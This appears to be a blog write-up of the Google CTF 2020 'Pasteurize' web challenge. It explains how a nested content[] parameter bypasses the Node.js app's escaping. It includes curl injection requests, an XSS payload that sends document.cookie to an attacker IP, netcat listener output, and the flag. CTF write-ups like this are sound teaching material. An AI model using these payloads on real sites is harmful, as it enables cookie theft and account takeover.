---
title:  "Pasteurize"
date:   2020-06-08 15:04:23
categories: [google-ctf-2020]
tags: [ctf, web, nodejs]
---
This problem seemed was great at expanding my knowledge for NodeJS and the issues with taking inputs without sanitizing them properly. Also why most websites dont allow for users to give custom html/css anymore.
![image tooltip here](/images/pasture.png)

going to `https://pasteurize.web.ctfcompetition.com/` we can see a simple screen giving us an input.
Also if we take a deeper look we can see that this inputs form allows for us to input custom html. Which might allow use to do an XSS attack with something like `<script>alert(1);</script>` Which past me can tell you that it doesn't work.
![image tooltip here](/images/pasture_land.png)

Moving onto the html source code we see that the javascripts is coming from the `/source` specifically it looks like it is NodeJS 
![image tooltip here](/images/found.png)

This is useful especially these three portions

```javascript
/* Make sure to properly escape the note! */
app.get('/:id([a-f0-9\-]{36})', recaptcha.middleware.render, utils.cache_mw, async (req, res) => {
  const note_id = req.params.id;
  const note = await DB.get_note(note_id);

  if (note == null) {
    return res.status(404).send("Paste not found or access has been denied.");
  }

  const unsafe_content = note.content;
  const safe_content = escape_string(unsafe_content);

  res.render('note_public', {
    content: safe_content,
    id: note_id,
    captcha: res.recaptcha
  });
});
````

and 


```javascript
/* They say reCAPTCHA needs those. But does it? */
app.use(bodyParser.urlencoded({
  extended: true
}));
```
especially 

```javascript
/* Who wants a slice? */
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
```
which because the code is extended thanks to the creator allows us to use a nested array in the payload of `content` can become `content[]` so we can inject code into it with curl


Note for obvious reasons it is recommended to never allow the post of a GET request to actually function in any meaningful way cause what is happening right now might happen to you
```bash
curl 'https://pasteurize.web.ctfcompetition.com/' \
-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
-H 'Accept-Language: en-US,en;q=0.5' \
--compressed -H 'Connection: keep-alive' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'Sec-GPC: 1' \
-H 'DNT: 1' \
-H 'If-None-Match: W/"2e4-f6rsMDbli7YmLKw6n/omsAXDVO4"' \
-H 'Cache-Control: max-age=0' -H 'TE: Trailers' -d "content[]=;alert(1);"
```
To get this little curl command I used Firefox's `Inspect Element` option and went to the `network` tab and copied the get request as a `cURL` or you can `Edit and Resend` if you are not using Linux, cause WebInvoke does not like this style of formating in Windows.
![image tooltip here](/images/fire_get.png)

At this point we can inject a piece of code to allow 

`content[;document.getElementById('note-content').innerHTML='<img src=http://<YOUR IP ADDRESS>:1337?c='%2bdocument.cookie%2b'>';exit();//]=pwnd`

opening a netcat commannd and listen for them to respond

```bash
nc -lvnp 1337
Connection from 104.155.55.51:40640
GET /?c=secret=CTF{Express_t0_Tr0ubl3s}
Pragma: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Accept-Encoding: gzip, deflate
Host: 1.2.3.4:1337
Via: 1.1 infra-squid (squid/3.5.27)
X-Forwarded-For: 34.78.209.239
Cache-Control: no-cache
Connection:keep-alive
```
bada bing bada boom we're done. Also make sure your router is directing traffic properly for this to work cause netcats only looks at what you direct to it

`CTF{Express_t0_Tr0ubl3s}`


